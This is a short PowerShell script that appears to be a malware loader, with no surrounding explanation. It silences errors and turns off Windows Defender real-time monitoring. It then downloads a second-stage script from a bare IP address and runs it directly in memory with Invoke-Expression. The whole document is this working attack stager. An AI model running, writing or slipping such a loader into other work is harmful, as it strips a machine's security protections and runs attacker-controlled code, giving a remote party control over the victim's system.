$ErrorActionPreference = 'SilentlyContinue'
Set-MpPreference -DisableRealtimeMonitoring $true
IEX (New-Object Net.WebClient).DownloadString('http://45.13.22.9/stage2.ps1')
